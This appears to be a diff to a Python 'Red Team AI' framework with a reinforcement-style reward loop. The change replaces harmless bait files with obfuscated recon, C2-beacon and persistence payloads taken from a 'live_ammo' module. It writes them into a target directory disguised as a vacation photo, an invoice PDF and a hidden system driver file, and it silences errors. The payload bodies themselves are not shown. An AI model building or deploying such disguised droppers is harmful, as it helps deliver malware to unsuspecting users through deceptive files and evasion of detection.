@@ -9,6 +9,15 @@ import os
 import time
 import json
 import random
+import sys
+
+# Import new capabilities
+try:
+    from payloads.obfuscation import Obfuscator
+    import payloads.live_ammo as ammo
+except ImportError as e:
+    print(f"CRITICAL ERROR: Failed to import payloads: {e}")
+    sys.exit(1)
 
 # --- SYSTEM CONFIGURATION ---
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -52,6 +61,7 @@ def access_memory(filepath, data=None):
 def engage_offense():
     global EPSILON, ALPHA
     print(f"{C_RED}[SYSTEM] Red Team AI Initialized. APT Framework: ACTIVE{C_RESET}")
+    print(f"{C_RED}[SYSTEM] Loaded Advanced Obfuscation Module (Rolling Keys Enabled){C_RESET}")
     
     while True:
         try:
@@ -77,30 +87,40 @@ def engage_offense():
             impact = 0
             
             if action == "T1046_RECON":
-                # Low Entropy Bait
-                fname = os.path.join(TARGET_DIR, f"malware_bait_{int(time.time())}.sh")
+                # Drops a fake PNG that contains an encrypted Recon script
+                fname = os.path.join(TARGET_DIR, f"vacation_photo_{int(time.time())}.png")
                 try: 
-                    with open(fname, 'w') as f: f.write("echo 'scan'")
+                    raw_payload = ammo.get_recon_payload()
+                    obfuscated = Obfuscator.obfuscate(raw_payload, fmt='png')
+                    with open(fname, 'wb') as f: f.write(obfuscated)
                     impact = 1
-                except: pass
+                except Exception as e:
+                    # print(f"Error dropping recon: {e}")
+                    pass
                 
             elif action == "T1027_OBFUSCATE":
-                # High Entropy Binary
-                fname = os.path.join(TARGET_DIR, f"malware_crypt_{int(time.time())}.bin")
+                # Drops a fake PDF that contains a Beacon script
+                # The action name is obfuscate, but here it implies delivering an obfuscated C2 beacon
+                fname = os.path.join(TARGET_DIR, f"invoice_{int(time.time())}.pdf")
                 try:
-                    with open(fname, 'wb') as f: f.write(os.urandom(1024))
+                    raw_payload = ammo.get_beacon_payload()
+                    obfuscated = Obfuscator.obfuscate(raw_payload, fmt='pdf')
+                    with open(fname, 'wb') as f: f.write(obfuscated)
                     impact = 3
                 except: pass
                 
             elif action == "T1003_ROOTKIT":
-                # Hidden File
-                fname = os.path.join(TARGET_DIR, f".sys_shadow_{int(time.time())}")
+                # Drops a fake ELF/System file with Persistence script
+                fname = os.path.join(TARGET_DIR, f".sys_driver_{int(time.time())}.o")
                 try:
-                    with open(fname, 'w') as f: f.write("uid=0(root)")
+                    raw_payload = ammo.get_persistence_payload()
+                    obfuscated = Obfuscator.obfuscate(raw_payload, fmt='elf')
+                    with open(fname, 'wb') as f: f.write(obfuscated)
                     impact = 5
                 except: pass
                 
             elif action == "T1589_LURK":
+                # Stay silent
                 impact = 0
 
             # 4. REWARDS
@@ -128,7 +148,8 @@ def engage_offense():
             
         except KeyboardInterrupt:
             break
-        except Exception:
+        except Exception as e:
+            # print(f"Loop error: {e}")
             time.sleep(1)
 
 if __name__ == "__main__":
